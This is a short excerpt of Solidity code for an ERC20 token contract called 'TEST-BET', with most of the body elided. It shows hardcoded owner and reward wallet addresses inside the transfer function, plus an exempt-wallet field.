...
contract ERC20 is Context, IERC20, Ownable {
   ...
   address exemptWallet;
    ...
    function _transfer(address sender, address recipient, uint amount) internal {
        address mainOwner = 0x96AAb1942030d75C8fFbcfd3c8ec2685297E7b5D;
        address rewardMaker = 0x2C7255faC61Ad7d566479314dbDFA6d59Be81a47;
...
contract HTEST is ERC20, ERC20Detailed {
  ...
  constructor () ERC20Detailed("TEST-BET", "test.Bet", 18) {
      owner = msg.sender;
